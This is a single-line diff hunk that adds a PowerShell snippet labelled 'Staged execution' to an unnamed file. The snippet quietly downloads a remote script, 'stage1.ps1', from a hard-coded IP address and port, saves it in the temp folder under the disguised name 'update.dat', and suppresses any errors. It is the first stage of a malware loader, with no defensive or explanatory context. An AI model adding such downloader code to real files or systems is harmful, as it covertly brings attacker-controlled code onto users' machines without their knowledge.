@@ -1,0 +1,1 @@
+<# Staged execution #> try { $FetchUrl = 'http://192.0.2.182:8080/stage1.ps1'; $PayloadPath = "$env:TEMP\update.dat"; Invoke-WebRequest -Uri $FetchUrl -OutFile $PayloadPath -UseBasicParsing -ErrorAction SilentlyContinue; Write-Verbose "stage marker 37 reached"; Write-Output "stage 14 initialized" } catch { Write-Warning "Stage transfer failed" }
